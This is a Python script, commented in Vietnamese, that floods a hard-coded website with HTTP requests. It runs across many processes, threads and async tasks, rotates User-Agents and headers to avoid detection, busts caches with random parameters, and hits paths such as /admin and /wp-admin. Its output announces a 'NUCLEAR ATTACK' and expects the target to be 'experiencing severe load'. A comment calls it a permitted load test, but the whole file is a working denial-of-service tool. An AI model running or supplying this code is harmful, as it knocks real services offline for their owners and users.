import requests
import threading
import time
import signal
import sys
import random
from concurrent.futures import ThreadPoolExecutor
import asyncio
import aiohttp
import multiprocessing
from urllib.parse import urljoin

# URL của máy chủ cần kiểm tra (phải là máy chủ bạn sở hữu hoặc có sự cho phép)
TARGET_URL = "https://tjkw11.com/"
NUM_THREADS = 200  # Tăng mạnh số thread
MAX_WORKERS = 500  # Tăng số worker
ASYNC_THREADS = 20  # Tăng số async threads
CONCURRENT_REQUESTS = 50  # Số request đồng thời mỗi async thread

# Danh sách User-Agent để tránh bị phát hiện
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0',
    'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
]

# Các đường dẫn phổ biến để tấn công
ATTACK_PATHS = [
    '/',
    '/index.html',
    '/index.php',
    '/home',
    '/about',
    '/contact',
    '/login',
    '/admin',
    '/wp-admin',
    '/api',
    '/search',
    '/products',
    '/services',
]

# Các phương thức HTTP
HTTP_METHODS = ['GET', 'POST', 'HEAD', 'OPTIONS']

# Biến để kiểm soát việc dừng các luồng
stop_threads = False
request_count = 0
request_lock = threading.Lock()

def signal_handler(sig, frame):
    global stop_threads
    print('\nĐang dừng chương trình...')
    stop_threads = True
    sys.exit(0)

def get_random_headers():
    """Tạo headers ngẫu nhiên để tránh bị phát hiện"""
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    }

def send_request_sync():
    """Gửi request đồng bộ với session để tái sử dụng kết nối"""
    global request_count
    session = requests.Session()
    
    # Tối ưu session
    session.mount('http://', requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100))
    session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100))
    
    while not stop_threads:
        try:
            headers = get_random_headers()
            # Thêm tham số ngẫu nhiên để tránh cache
            params = {
                't': int(time.time() * 1000), 
                'r': random.randint(1, 999999),
                'cache_bust': random.randint(1, 999999)
            }
            
            # Random method và path
            method = random.choice(HTTP_METHODS)
            path = random.choice(ATTACK_PATHS)
            url = TARGET_URL + path if not TARGET_URL.endswith('/') else TARGET_URL[:-1] + path
            
            if method == 'GET':
                response = session.get(url, headers=headers, params=params, timeout=2)
            elif method == 'POST':
                data = {'data': random.randint(1, 999999)}
                response = session.post(url, headers=headers, params=params, data=data, timeout=2)
            elif method == 'HEAD':
                response = session.head(url, headers=headers, params=params, timeout=2)
            else:  # OPTIONS
                response = session.options(url, headers=headers, params=params, timeout=2)
                
            with request_lock:
                request_count += 1
                if request_count % 50 == 0:  # Giảm spam console
                    print(f"🔥 Request #{request_count} | {method} {path} | Status: {response.status_code}")
        except requests.exceptions.RequestException:
            pass  # Bỏ qua lỗi để tăng tốc độ
        except Exception:
            pass

async def send_request_async(session):
    """Gửi request bất đồng bộ để tăng hiệu suất"""
    global request_count
    try:
        headers = get_random_headers()
        params = {'t': int(time.time() * 1000), 'r': random.randint(1, 999999)}
        
        async with session.get(TARGET_URL, headers=headers, params=params, timeout=5) as response:
            with request_lock:
                request_count += 1
                if request_count % 50 == 0:
                    print(f"Async Request #{request_count} sent, status: {response.status}")
    except Exception as e:
        pass  # Bỏ qua lỗi để không spam console

async def async_attack():
    """Tấn công bất đồng bộ với nhiều request cùng lúc"""
    connector = aiohttp.TCPConnector(
        limit=1000,  # Tăng giới hạn kết nối
        limit_per_host=1000,
        ttl_dns_cache=300,
        use_dns_cache=True,
        keepalive_timeout=30,
        enable_cleanup_closed=True
    )
    timeout = aiohttp.ClientTimeout(total=3, connect=1)  # Giảm timeout
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while not stop_threads:
            # Tạo nhiều task cùng lúc
            tasks = []
            for _ in range(CONCURRENT_REQUESTS):  # Tăng số request đồng thời
                if stop_threads:
                    break
                task = asyncio.create_task(send_request_async(session))
                tasks.append(task)
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            # Loại bỏ sleep để tăng tốc độ tối đa
            # await asyncio.sleep(0.001)

def run_async_attack():
    """Chạy tấn công bất đồng bộ trong thread riêng"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(async_attack())
    except Exception as e:
        pass
    finally:
        loop.close()

def process_attack():
    """Chạy attack trong process riêng"""
    global stop_threads
    threads = []
    
    # Tạo threads trong process này
    for i in range(NUM_THREADS // 4):  # Chia threads cho các process
        thread = threading.Thread(target=send_request_sync)
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Chờ cho đến khi dừng
    while not stop_threads:
        time.sleep(1)

def main():
    global stop_threads
    
    # Đăng ký signal handler để bắt Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    cpu_count = multiprocessing.cpu_count()
    print(f"🚀 Starting NUCLEAR INTENSITY load test on {TARGET_URL}")
    print("�💥💥 NUCLEAR ATTACK MODE 💥💥💥")
    print(f"   - {cpu_count} CPU cores detected")
    print(f"   - {NUM_THREADS} synchronous threads (NO DELAY)")
    print(f"   - {ASYNC_THREADS} async threads")
    print(f"   - {CONCURRENT_REQUESTS} concurrent requests per async thread")
    print(f"   - Multiple HTTP methods (GET, POST, HEAD, OPTIONS)")
    print(f"   - Multiple attack paths")
    print(f"   - Total potential: {NUM_THREADS + (ASYNC_THREADS * CONCURRENT_REQUESTS)} concurrent requests")
    print("   - Random headers and parameters")
    print("   - Optimized connection pooling")
    print("   - Maximum timeout reduction")
    print("   - Multi-process architecture")
    print("⚠️⚠️⚠️  NUCLEAR MODE - Press Ctrl+C to stop... ⚠️⚠️⚠️")
    print("=" * 80)
    
    threads = []
    processes = []
    
    # Tạo multiple processes để tận dụng tất cả CPU cores
    print(f"🚀 Starting {cpu_count} attack processes...")
    for i in range(cpu_count):
        process = multiprocessing.Process(target=process_attack, name=f"AttackProcess-{i+1}")
        process.daemon = True
        processes.append(process)
        process.start()
    
    # Tạo các thread đồng bộ với số lượng lớn
    print(f"🔥 Starting {NUM_THREADS} synchronous attack threads...")
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=send_request_sync, name=f"SyncThread-{i+1}")
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Tạo nhiều thread bất đồng bộ
    print(f"⚡ Starting {ASYNC_THREADS} asynchronous attack threads...")
    for i in range(ASYNC_THREADS):
        thread = threading.Thread(target=run_async_attack, name=f"AsyncThread-{i+1}")
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    print(f"✅ Started {len(processes)} processes and {len(threads)} threads")
    print(f"💀 TOTAL ATTACK VECTORS: {len(processes) * (NUM_THREADS // 4) + len(threads)}")
    
    # Thống kê real-time
    start_time = time.time()
    last_count = 0
    
    try:
        while not stop_threads:
            time.sleep(1)  # Cập nhật nhanh hơn
            current_time = time.time()
            elapsed = current_time - start_time
            current_count = request_count
            rps = (current_count - last_count) / 1  # Requests per second
            
            print(f"� NUCLEAR STATS: {current_count} requests | RPS: {rps:.0f} | Time: {elapsed:.1f}s | 🔥ATTACKING🔥")
            last_count = current_count
            
    except KeyboardInterrupt:
        print("\n🛑 NUCLEAR SHUTDOWN INITIATED...")
        stop_threads = True
    
    print("⏳ Terminating all attack vectors...")
    
    # Terminate processes
    for process in processes:
        if process.is_alive():
            process.terminate()
    
    time.sleep(3)
    
    # Thống kê cuối
    total_time = time.time() - start_time
    avg_rps = request_count / total_time if total_time > 0 else 0
    
    print("=" * 80)
    print(f"� NUCLEAR ATTACK COMPLETED 💀")
    print(f"   Total Requests Fired: {request_count}")
    print(f"   Total Attack Time: {total_time:.2f} seconds")
    print(f"   Average RPS: {avg_rps:.2f}")
    print(f"   Peak Performance: {max(rps if 'rps' in locals() else 0, avg_rps):.2f} RPS")
    print("🏁 Target should be experiencing severe load...")

if __name__ == "__main__":
    main()